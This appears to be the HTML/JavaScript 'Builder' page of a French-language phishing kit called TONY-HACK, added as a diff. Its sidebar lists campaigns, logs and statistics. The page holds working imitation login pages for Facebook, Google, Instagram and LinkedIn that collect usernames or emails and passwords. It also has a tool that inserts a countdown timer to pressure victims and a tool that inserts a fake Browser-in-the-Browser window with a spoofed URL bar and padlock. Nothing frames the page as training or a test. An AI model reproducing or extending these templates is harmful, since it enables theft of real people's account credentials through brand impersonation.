@@ -1,0 +1,647 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TONY-HACK | Builder</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/codemirror.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/theme/dracula.min.css">
+    <style>
+        .builder-container {
+            display: flex;
+            height: calc(100vh - 120px);
+            gap: 20px;
+        }
+        .editor-panel {
+            flex: 1;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+        .preview-panel {
+            flex: 1;
+            background: white;
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+        .panel-header {
+            padding: 12px 16px;
+            background: var(--bg-dark);
+            border-bottom: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .panel-header h4 {
+            font-size: 14px;
+            font-weight: 600;
+        }
+        .panel-header h4 i {
+            margin-right: 8px;
+            color: var(--primary);
+        }
+        .CodeMirror {
+            flex: 1;
+            height: 100%;
+            font-size: 14px;
+        }
+        .preview-frame {
+            flex: 1;
+            width: 100%;
+            border: none;
+            background: white;
+        }
+        .quick-templates {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin-bottom: 16px;
+        }
+        .quick-template-btn {
+            padding: 8px 16px;
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            color: var(--text-primary);
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .quick-template-btn:hover {
+            background: var(--primary);
+            border-color: var(--primary);
+        }
+        .timer-config {
+            display: none;
+            margin-top: 16px;
+            padding: 16px;
+            background: var(--bg-dark);
+            border-radius: 8px;
+        }
+        .bitb-config {
+            display: none;
+            margin-top: 16px;
+            padding: 16px;
+            background: var(--bg-dark);
+            border-radius: 8px;
+        }
+    </style>
+</head>
+<body>
+    <div class="sidebar">
+        <div class="sidebar-header"><h2>TONY-HACK</h2></div>
+        <div class="sidebar-user">
+            <div class="avatar"><i class="fas fa-user-shield"></i></div>
+            <div class="user-info"><h4>{{ session.get('user', 'admin') }}</h4><p>Administrateur</p></div>
+        </div>
+        <div class="sidebar-nav">
+            <a href="/" class="nav-item"><i class="fas fa-home"></i><span>Dashboard</span></a>
+            <a href="/campaigns" class="nav-item"><i class="fas fa-bullhorn"></i><span>Campagnes</span></a>
+            <a href="/templates" class="nav-item"><i class="fas fa-file-code"></i><span>Templates</span></a>
+            <a href="/builder" class="nav-item active"><i class="fas fa-code"></i><span>Builder</span></a>
+            <a href="/logs" class="nav-item"><i class="fas fa-list"></i><span>Logs</span></a>
+            <a href="/statistics" class="nav-item"><i class="fas fa-chart-bar"></i><span>Statistiques</span></a>
+            <a href="/settings" class="nav-item"><i class="fas fa-cog"></i><span>Paramètres</span></a>
+            <a href="/profile" class="nav-item"><i class="fas fa-user-circle"></i><span>Profil</span></a>
+        </div>
+        <div class="sidebar-footer">
+            <a href="/logout" class="nav-item" onclick="return confirm('Déconnexion ?')"><i class="fas fa-sign-out-alt"></i><span>Déconnexion</span></a>
+        </div>
+    </div>
+    
+    <div class="main-content">
+        <div class="page-header">
+            <h1 class="page-title">Code <span>Builder</span></h1>
+            <div class="flex items-center gap-2">
+                <select id="templateType" style="width: auto; padding: 8px 16px;">
+                    <option value="custom">Custom</option>
+                    <option value="facebook">Facebook</option>
+                    <option value="google">Google</option>
+                    <option value="instagram">Instagram</option>
+                    <option value="linkedin">LinkedIn</option>
+                    <option value="netflix">Netflix</option>
+                    <option value="paypal">PayPal</option>
+                </select>
+                <input type="color" id="templateColor" value="#e94560" style="width: 50px; padding: 4px;">
+                <input type="text" id="templateName" placeholder="Nom du template" style="width: 200px;" value="Nouveau Template">
+                <button class="btn btn-primary" onclick="saveTemplate()">
+                    <i class="fas fa-save"></i> Sauvegarder
+                </button>
+                <button class="btn btn-secondary" onclick="downloadTemplate()">
+                    <i class="fas fa-download"></i>
+                </button>
+            </div>
+        </div>
+        
+        <!-- Quick Templates -->
+        <div class="quick-templates">
+            <button class="quick-template-btn" onclick="loadQuickTemplate('facebook')">
+                <i class="fab fa-facebook"></i> Facebook
+            </button>
+            <button class="quick-template-btn" onclick="loadQuickTemplate('google')">
+                <i class="fab fa-google"></i> Google
+            </button>
+            <button class="quick-template-btn" onclick="loadQuickTemplate('instagram')">
+                <i class="fab fa-instagram"></i> Instagram
+            </button>
+            <button class="quick-template-btn" onclick="loadQuickTemplate('linkedin')">
+                <i class="fab fa-linkedin"></i> LinkedIn
+            </button>
+            <button class="quick-template-btn" onclick="loadQuickTemplate('blank')">
+                <i class="fas fa-file"></i> Page Blanche
+            </button>
+            <button class="quick-template-btn" onclick="toggleTimerConfig()">
+                <i class="fas fa-clock"></i> Countdown Timer
+            </button>
+            <button class="quick-template-btn" onclick="toggleBitBConfig()">
+                <i class="fas fa-window-maximize"></i> Browser-in-Browser
+            </button>
+        </div>
+        
+        <!-- Timer Configuration -->
+        <div class="timer-config" id="timerConfig">
+            <h4 style="margin-bottom: 16px;"><i class="fas fa-clock"></i> Configuration du Countdown Timer</h4>
+            <div style="display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px;">
+                <div class="form-group">
+                    <label>Minutes</label>
+                    <input type="number" id="timerMinutes" value="5" min="0" max="60">
+                </div>
+                <div class="form-group">
+                    <label>Secondes</label>
+                    <input type="number" id="timerSeconds" value="0" min="0" max="59">
+                </div>
+                <div class="form-group">
+                    <label>Message d'urgence</label>
+                    <input type="text" id="timerMessage" value="⚠️ Action requise avant expiration !">
+                </div>
+            </div>
+            <button class="btn btn-primary btn-sm" onclick="insertTimer()">Insérer le Timer</button>
+        </div>
+        
+        <!-- Browser-in-Browser Configuration -->
+        <div class="bitb-config" id="bitbConfig">
+            <h4 style="margin-bottom: 16px;"><i class="fas fa-window-maximize"></i> Browser-in-the-Browser</h4>
+            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 16px;">
+                <div class="form-group">
+                    <label>URL de la fausse fenêtre</label>
+                    <input type="text" id="bitbUrl" value="https://www.facebook.com/login">
+                </div>
+                <div class="form-group">
+                    <label>Titre de la fenêtre</label>
+                    <input type="text" id="bitbTitle" value="Facebook - Connexion">
+                </div>
+            </div>
+            <button class="btn btn-primary btn-sm" onclick="insertBitB()">Insérer Browser-in-Browser</button>
+        </div>
+        
+        <!-- Editor and Preview -->
+        <div class="builder-container">
+            <div class="editor-panel">
+                <div class="panel-header">
+                    <h4><i class="fas fa-code"></i> Éditeur HTML/CSS/JS</h4>
+                    <div>
+                        <button class="btn btn-secondary btn-sm" onclick="formatCode()">
+                            <i class="fas fa-align-left"></i> Formater
+                        </button>
+                        <button class="btn btn-secondary btn-sm" onclick="refreshPreview()">
+                            <i class="fas fa-sync-alt"></i> Actualiser
+                        </button>
+                    </div>
+                </div>
+                <textarea id="codeEditor"></textarea>
+            </div>
+            
+            <div class="preview-panel">
+                <div class="panel-header">
+                    <h4><i class="fas fa-eye"></i> Aperçu en direct</h4>
+                    <div>
+                        <select id="devicePreview" onchange="changeDevicePreview()" style="width: auto; padding: 4px 8px;">
+                            <option value="100%">Desktop</option>
+                            <option value="375px">Mobile (iPhone SE)</option>
+                            <option value="768px">Tablette</option>
+                        </select>
+                    </div>
+                </div>
+                <iframe id="previewFrame" class="preview-frame"></iframe>
+            </div>
+        </div>
+    </div>
+    
+    <div class="toast-container" id="toastContainer"></div>
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/codemirror.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/xml/xml.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/css/css.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/javascript/javascript.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.2/mode/htmlmixed/htmlmixed.min.js"></script>
+    
+    <script>
+        let editor;
+        
+        const defaultCode = `<!DOCTYPE html>
+<html>
+<head>
+    <title>Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .login-box {
+            background: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+            width: 100%;
+            max-width: 380px;
+        }
+        h2 { text-align: center; margin-bottom: 30px; color: #333; }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            background: #667eea;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        button:hover { background: #5a67d8; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <h2>Connexion</h2>
+        <form method="POST">
+            <input type="text" name="username" placeholder="Nom d'utilisateur" required>
+            <input type="password" name="password" placeholder="Mot de passe" required>
+            <button type="submit">Se connecter</button>
+        </form>
+    </div>
+</body>
+</html>`;
+        
+        const quickTemplates = {
+            facebook: `<!DOCTYPE html>
+<html>
+<head><title>Facebook - Connexion</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5}
+.container{max-width:400px;margin:50px auto;padding:20px}
+.logo{text-align:center;margin-bottom:20px}
+.logo h1{color:#1877f2;font-size:40px;font-weight:bold}
+.box{background:white;border-radius:8px;padding:20px;box-shadow:0 2px 4px rgba(0,0,0,0.1)}
+input{width:100%;padding:14px;margin:10px 0;border:1px solid #ddd;border-radius:6px;font-size:16px}
+button{width:100%;padding:14px;background:#1877f2;color:white;border:none;border-radius:6px;font-size:18px;font-weight:bold;cursor:pointer}
+button:hover{background:#166fe5}
+</style>
+</head>
+<body>
+<div class="container">
+<div class="logo"><h1>facebook</h1></div>
+<div class="box">
+<form method="POST">
+<input type="text" name="email" placeholder="Adresse e-mail ou téléphone" required>
+<input type="password" name="password" placeholder="Mot de passe" required>
+<button type="submit">Se connecter</button>
+</form>
+</div>
+</div>
+</body>
+</html>`,
+            google: `<!DOCTYPE html>
+<html>
+<head><title>Google - Connexion</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Google Sans',Arial,sans-serif;background:#fff}
+.container{max-width:450px;margin:50px auto;padding:48px 40px}
+.logo{text-align:center;margin-bottom:30px}
+h2{font-size:24px;font-weight:400;margin-bottom:10px}
+.subtitle{color:#5f6368;margin-bottom:30px}
+input{width:100%;padding:14px;margin:10px 0;border:1px solid #dadce0;border-radius:4px;font-size:16px}
+input:focus{outline:none;border-color:#1a73e8}
+button{width:100%;padding:12px;background:#1a73e8;color:white;border:none;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;margin-top:30px}
+button:hover{background:#1557b0}
+</style>
+</head>
+<body>
+<div class="container">
+<div class="logo"><span style="font-size:24px;color:#1a73e8;">G</span><span style="color:#ea4335;">o</span><span style="color:#fbbc04;">o</span><span style="color:#1a73e8;">g</span><span style="color:#34a853;">l</span><span style="color:#ea4335;">e</span></div>
+<h2>Connexion</h2>
+<div class="subtitle">Utiliser votre compte Google</div>
+<form method="POST">
+<input type="email" name="email" placeholder="Adresse e-mail" required>
+<input type="password" name="password" placeholder="Mot de passe" required>
+<button type="submit">Suivant</button>
+</form>
+</div>
+</body>
+</html>`,
+            instagram: `<!DOCTYPE html>
+<html>
+<head><title>Instagram • Connexion</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#fafafa}
+.container{max-width:350px;margin:50px auto}
+.box{background:white;border:1px solid #dbdbdb;border-radius:1px;padding:40px}
+.logo{text-align:center;margin-bottom:30px;font-size:36px;font-style:italic}
+input{width:100%;padding:10px 8px;margin:6px 0;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;font-size:14px}
+button{width:100%;padding:8px;background:#0095f6;color:white;border:none;border-radius:4px;font-weight:600;cursor:pointer;margin:16px 0}
+button:hover{background:#1877f2}
+</style>
+</head>
+<body>
+<div class="container">
+<div class="box">
+<div class="logo">Instagram</div>
+<form method="POST">
+<input type="text" name="username" placeholder="Nom d'utilisateur" required>
+<input type="password" name="password" placeholder="Mot de passe" required>
+<button type="submit">Connexion</button>
+</form>
+</div>
+</div>
+</body>
+</html>`,
+            linkedin: `<!DOCTYPE html>
+<html>
+<head><title>LinkedIn • Connexion</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,system-ui,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f3f2ef}
+.container{max-width:400px;margin:50px auto}
+.logo{text-align:center;margin-bottom:24px}
+.logo h1{color:#0a66c2;font-size:32px;font-weight:600}
+.box{background:white;border-radius:8px;padding:24px;box-shadow:0 4px 12px rgba(0,0,0,0.15)}
+input{width:100%;padding:14px;margin:8px 0;border:1px solid rgba(0,0,0,0.6);border-radius:4px;font-size:16px}
+button{width:100%;padding:16px;background:#0a66c2;color:white;border:none;border-radius:28px;font-size:16px;font-weight:600;cursor:pointer}
+button:hover{background:#004182}
+</style>
+</head>
+<body>
+<div class="container">
+<div class="logo"><h1>LinkedIn</h1></div>
+<div class="box">
+<form method="POST">
+<input type="text" name="email" placeholder="Adresse e-mail" required>
+<input type="password" name="password" placeholder="Mot de passe" required>
+<button type="submit">S'identifier</button>
+</form>
+</div>
+</div>
+</body>
+</html>`,
+            blank: `<!DOCTYPE html>
+<html>
+<head><title>Login</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:Arial,sans-serif;background:#f5f5f5;display:flex;align-items:center;justify-content:center;min-height:100vh}
+.container{background:white;padding:30px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);width:100%;max-width:350px}
+h2{text-align:center;margin-bottom:20px}
+input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px}
+button{width:100%;padding:12px;background:#e94560;color:white;border:none;border-radius:4px;cursor:pointer}
+button:hover{background:#c13b52}
+</style>
+</head>
+<body>
+<div class="container">
+<h2>Connexion</h2>
+<form method="POST">
+<input type="text" name="username" placeholder="Nom d'utilisateur" required>
+<input type="password" name="password" placeholder="Mot de passe" required>
+<button type="submit">Se connecter</button>
+</form>
+</div>
+</body>
+</html>`
+        };
+        
+        function showToast(title, message, type = 'info') {
+            const container = document.getElementById('toastContainer');
+            const toast = document.createElement('div');
+            toast.className = `toast ${type}`;
+            let icon = type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-circle' : 'info-circle';
+            toast.innerHTML = `<i class="fas fa-${icon}"></i><div class="toast-content"><div class="toast-title">${title}</div><div class="toast-message">${message}</div></div>`;
+            container.appendChild(toast);
+            setTimeout(() => { toast.style.opacity = '0'; setTimeout(() => toast.remove(), 300); }, 4000);
+        }
+        
+        function initEditor() {
+            editor = CodeMirror.fromTextArea(document.getElementById('codeEditor'), {
+                mode: 'htmlmixed',
+                theme: 'dracula',
+                lineNumbers: true,
+                lineWrapping: true,
+                indentUnit: 4,
+                tabSize: 4,
+                autoCloseTags: true,
+                autoCloseBrackets: true,
+                matchBrackets: true
+            });
+            
+            editor.setValue(defaultCode);
+            refreshPreview();
+            
+            editor.on('change', function() {
+                refreshPreview();
+            });
+        }
+        
+        function refreshPreview() {
+            const code = editor.getValue();
+            const frame = document.getElementById('previewFrame');
+            const doc = frame.contentDocument || frame.contentWindow.document;
+            doc.open();
+            doc.write(code);
+            doc.close();
+        }
+        
+        function changeDevicePreview() {
+            const width = document.getElementById('devicePreview').value;
+            document.getElementById('previewFrame').style.maxWidth = width;
+            document.getElementById('previewFrame').style.margin = width === '100%' ? '0' : '0 auto';
+        }
+        
+        function loadQuickTemplate(type) {
+            if (quickTemplates[type]) {
+                editor.setValue(quickTemplates[type]);
+                document.getElementById('templateType').value = type === 'blank' ? 'custom' : type;
+                refreshPreview();
+                showToast('Template chargé', `Template ${type} chargé avec succès`, 'success');
+            }
+        }
+        
+        function toggleTimerConfig() {
+            const config = document.getElementById('timerConfig');
+            config.style.display = config.style.display === 'none' ? 'block' : 'none';
+        }
+        
+        function toggleBitBConfig() {
+            const config = document.getElementById('bitbConfig');
+            config.style.display = config.style.display === 'none' ? 'block' : 'none';
+        }
+        
+        function insertTimer() {
+            const minutes = document.getElementById('timerMinutes').value;
+            const seconds = document.getElementById('timerSeconds').value;
+            const message = document.getElementById('timerMessage').value;
+            
+            const timerCode = `
+<div style="background: #fff3cd; border: 1px solid #ffc107; border-radius: 8px; padding: 16px; margin: 16px 0; text-align: center;">
+    <p style="color: #856404; margin-bottom: 10px; font-weight: bold;">${message}</p>
+    <div style="font-size: 32px; font-weight: bold; color: #dc3545;" id="countdown-timer">${minutes}:${seconds.padStart(2, '0')}</div>
+</div>
+<script>
+(function() {
+    let timeLeft = ${parseInt(minutes) * 60 + parseInt(seconds)};
+    const timerEl = document.getElementById('countdown-timer');
+    
+    const interval = setInterval(() => {
+        if (timeLeft <= 0) {
+            clearInterval(interval);
+            timerEl.textContent = 'EXPIRÉ !';
+            timerEl.style.color = '#dc3545';
+            return;
+        }
+        
+        timeLeft--;
+        const mins = Math.floor(timeLeft / 60);
+        const secs = timeLeft % 60;
+        timerEl.textContent = mins + ':' + secs.toString().padStart(2, '0');
+        
+        if (timeLeft < 60) {
+            timerEl.style.color = '#dc3545';
+            timerEl.style.animation = 'pulse 1s infinite';
+        }
+    }, 1000);
+    
+    const style = document.createElement('style');
+    style.textContent = '@keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.5; } }';
+    document.head.appendChild(style);
+})();
+<\/script>`;
+            
+            const cursor = editor.getCursor();
+            editor.replaceRange(timerCode, cursor);
+            refreshPreview();
+            toggleTimerConfig();
+            showToast('Timer inséré', 'Countdown timer ajouté au template', 'success');
+        }
+        
+        function insertBitB() {
+            const url = document.getElementById('bitbUrl').value;
+            const title = document.getElementById('bitbTitle').value;
+            
+            const bitbCode = `
+<div style="position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 90%; max-width: 800px; background: white; border-radius: 8px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); z-index: 9999;">
+    <div style="background: #2d2d2d; padding: 12px 16px; border-radius: 8px 8px 0 0; display: flex; align-items: center; gap: 8px;">
+        <div style="display: flex; gap: 6px;">
+            <span style="width: 12px; height: 12px; border-radius: 50%; background: #ff5f56;"></span>
+            <span style="width: 12px; height: 12px; border-radius: 50%; background: #ffbd2e;"></span>
+            <span style="width: 12px; height: 12px; border-radius: 50%; background: #27c93f;"></span>
+        </div>
+        <div style="flex: 1; text-align: center; color: #aaa; font-size: 13px;">${title}</div>
+        <div style="width: 40px;"></div>
+    </div>
+    <div style="background: #1a1a1a; padding: 8px 16px; border-bottom: 1px solid #333;">
+        <div style="display: flex; align-items: center; gap: 8px; color: #aaa; font-size: 12px;">
+            <i class="fas fa-lock" style="color: #27c93f;"></i>
+            <span>${url}</span>
+        </div>
+    </div>
+    <iframe src="${url}" style="width: 100%; height: 500px; border: none; border-radius: 0 0 8px 8px;"></iframe>
+</div>
+<div style="position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.5); z-index: 9998;"></div>`;
+            
+            const cursor = editor.getCursor();
+            editor.replaceRange(bitbCode, cursor);
+            refreshPreview();
+            toggleBitBConfig();
+            showToast('BiTB inséré', 'Browser-in-the-Browser ajouté', 'success');
+        }
+        
+        function formatCode() {
+            const code = editor.getValue();
+            // Formatage simple
+            const formatted = code.replace(/>\s+</g, '>\n<');
+            editor.setValue(formatted);
+            refreshPreview();
+            showToast('Formaté', 'Code formaté', 'success');
+        }
+        
+        async function saveTemplate() {
+            const name = document.getElementById('templateName').value;
+            const type = document.getElementById('templateType').value;
+            const color = document.getElementById('templateColor').value;
+            const content = editor.getValue();
+            
+            try {
+                const response = await fetch('/api/templates', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ name, type, color, content })
+                });
+                
+                if (response.ok) {
+                    showToast('Sauvegardé', 'Template sauvegardé avec succès', 'success');
+                    setTimeout(() => window.location.href = '/templates', 1500);
+                }
+            } catch (e) {
+                showToast('Erreur', 'Impossible de sauvegarder', 'error');
+            }
+        }
+        
+        function downloadTemplate() {
+            const content = editor.getValue();
+            const blob = new Blob([content], {type: 'text/html'});
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'template.html';
+            a.click();
+            URL.revokeObjectURL(url);
+        }
+        
+        // Raccourci Ctrl+S
+        document.addEventListener('keydown', (e) => {
+            if (e.ctrlKey && e.key === 's') {
+                e.preventDefault();
+                saveTemplate();
+            }
+        });
+        
+        document.addEventListener('DOMContentLoaded', initEditor);
+    </script>
+</body>
+</html>
